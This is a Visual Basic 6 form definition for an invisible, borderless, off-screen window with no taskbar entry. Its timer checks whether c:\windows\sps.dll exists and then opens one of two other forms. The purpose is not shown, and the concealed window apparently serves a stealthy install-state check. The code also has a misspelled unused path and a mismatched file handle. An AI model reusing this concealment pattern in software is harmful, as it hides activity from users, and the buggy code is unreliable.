VERSION 5.00
Begin VB.Form Form4 
   BorderStyle     =   0  'None
   ClientHeight    =   90
   ClientLeft      =   2700
   ClientTop       =   -4230
   ClientWidth     =   135
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   135
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   1920
      Top             =   1800
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Timer1_Timer()
On Error GoTo error1
FileNumber = FreeFile
filename = "c:\window\sps.dll"
Open "c:\windows\sps.dll" For Input As #FileNumber
Close #1
Timer1.Enabled = False
Unload Me
Form3.Show
Exit Sub
error1:
Unload Me
Form2.Show
End Sub


